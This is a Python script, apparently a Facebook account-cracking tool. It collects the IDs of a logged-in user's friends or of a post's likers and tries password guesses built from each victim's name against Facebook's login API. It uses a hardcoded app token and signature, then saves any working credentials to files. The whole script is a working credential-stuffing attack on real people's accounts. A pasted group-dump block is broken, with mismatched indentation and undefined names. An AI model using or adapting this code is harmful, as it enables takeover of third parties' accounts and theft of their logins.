import os,sys,time,requests,json,random
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Back
B = Fore.BLUE
W = Fore.WHITE
C = Fore.CYAN
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
M = Fore.MAGENTA
BL = Fore.BLACK
ERR = f"   {R}[!]{W} "
QUE = f"   {M}[?]{W} "
INF = f"   {M}[+]{W} "
DAN = f"{R} [!]"
id=[]
die=0
cp=[]
ok=[]
def back():
    input(W+"["+warna+" Press Enter To Back "+W+"]")
    os.system('python mbf.py')
def baner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""   
   {M}╔═╗{W}┬┌┬┐┌─┐┬  ┌─┐  {M}╔╦╗{W}╔╗ ╔═╗
   {M}╚═╗{W}││││├─┘│  ├┤   {M}║║║{W}╠╩╗╠╣ 
   {M}╚═╝{W}┴┴ ┴┴  ┴─┘└─┘  {M}╩ ╩{W}╚═╝╚  \033[00m""")

    print("   "+Back.WHITE+BL+"      By : Fahmi Apz      \n\033[00m")
def masuk():
    try:
        tk=open("token").read()
    except FileNotFoundError:
        tk=input(QUE+W+"Token "+R+":"+warna+" ")
    req=requests.get("https://graph.facebook.com/me?access_token="+tk).text
    if "id" in req:
        with open("token","w") as ex:
             ex.write(tk)
        return tk
    else:
        print(ERR+"Token Not Valid!")
        back()
def info():
    req=requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}").text
    js=json.loads(req)
    print(W+"   Login as : "+warna+js["name"])
    print(W+"   ID       : "+warna+js["id"])
    print()
def home():
    baner()
    print(f"""
   {warna}1). {W}Go To Menu
   {warna}2). {W}Delete Token
   {warna}0). {W}Exit\033[00m""")
    f=input(W+"   >> "+warna)
    if f == "01" or f == "1":
       if not masuk():
              print(ERR +' You Must Login!')
              back()
       else:
              menu()
    elif f == "02" or f == "2":
       try:
           os.remove('token')
       except:
            pass
       print()
       print(INF + "Done!")
       back()
    elif f == "00" or f == "0":
       baner()
       sys.exit(W+"   Thanks you for use this tool :)")
def menu():
    baner()
    info()
    print(f"""   
   {warna}1). {W}Crack From Friendlist
   {warna}2). {W}Crack From Friend    
   {warna}3). {W}Crack From Post
   {warna}0). {W}Back""")
    f=input(W+"   >> "+warna)
    if f == "00" or f == "0":
       home()
    if f == "01" or f == "1":
       baner()
       info()
       req=requests.get(f"https://graph.facebook.com/me?fields=friends.limit(5000)&access_token={token}").text
       js=json.loads(req)
       for x in js['friends']['data']:
           id.append(x['name'] + '|' + x['id'])
       print(QUE+"Start Crack...")
       for user in id:
           ss=user.split("|")
           us=ss[0].split(" ")
           for x in us:
               litpas=[
                    str(x) + "123",
                    str(x) + "1234",
                    str(x) + "12345",
                    str(x) + "123456"
               ]
               litpas.append('Sayang')
               for passw in set(litpas):
                   login(ss[1],passw)
       print(INF+"Done!")
       back()
    elif f == "02" or f == "2":
       def getGid():
	banner()
	gid=input("\n[in] your groups id: ")
	try:
		os.mkdir('dump')
	except OSError: pass
	class dumps:
		def __init__(self):
			self.req=requests.Session()
			self.b=open('dump/group_'+gid+'_id.txt','w')
			self.dum(f"https://graph.facebook.com/{gid}/members?fields=id&access_token={str(toket)}")
		
		def dum(self,idi):
			self.re=self.req.get(idi).json()
			for i in self.re['data']:
				self.b.write(i['id'] + '\n')
				c=open('dump/group_'+gid+'_id.txt').readlines()
				print('\r[%s] %s retrieved'%(len(c),i['id']),end='')

			try:
				self.dum(self.re["paging"]["next"])
			except KeyError: pass
	try:			
		dumps()
		of=open('dump/group_'+gid+'_id.txt','r').readlines()
		if len(of) > 0:
			print('\n[!] all group id successfuly retreived')
			print("[!] file saved: dump/group_%s_id.txt"%(gid))
		else:
			print('\n[!] failed retreived groups id')
	except (KeyboardInterrupt,EOFError):
		exit("\n[!] Key interrupt: Stoped.")
    elif f == "03" or f == "3":
       baner()
       info()
       cc=input(QUE+"PostID : "+warna)
       req=requests.get(f"https://graph.facebook.com/{cc}?fields=likes.sumary(true)&access_token={token}").text
       js=json.loads(req)
       for x in js["likes"]["data"]:
           id.append(x["name"] + "|" + x["id"])
       print(QUE+"Start Crack...")
       for user in id:
           ss=user.split('|')
           us=ss[0].split(' ')
           for x in us:
               litpas=[
                    str(x) + "123",
                    str(x) + "1234",
                    str(x) + "12345",
                    str(x) + "123456"
               ]
               litpas.append('Sayang')
               for passw in set(litpas):
                   login(ss[1],passw)
       print(INF+"Done!")
       back()
def login(username,password,cek=False):
          global die
          b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
          params = {
                   'access_token': b,
                   'format': 'JSON',
                   'sdk_version': '2',
                   'email': username,
                   'locale': 'en_US',
                   'password': password,
                   'sdk': 'ios',
                   'generate_session_cookies': '1',
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
          }
          api = 'https://b-api.facebook.com/method/auth.login'
          response = requests.get(api, params=params)
          if "EAA" in response.text:
             print(f"   {W}[{G}Ok{W}] \033[00m{username}{R}<->\033[00m{password}")
             if cek:
                ok.append(username + "|" + password)
             else:
                with open('life.txt','a') as ex:
                     ex.write(username + "|" + password + "\n")
          elif "www.facebook.com" in response.json()['error_msg']:
               print(f"   {W}[{Y}Cp{W}] \033[00m{username}{R}<->\033[00m{password}")
               if cek:
                  cp.append(username + "|" + password)
               else:
                  with open("check.txt","a") as ex:
                       ex.write(username + "|" + password + "\n")
          else:
               die+=1
if __name__=="__main__":
    rd=[Y,G,C,M]
    warna=random.choice(rd)
    baner()
    token=masuk()
    home()
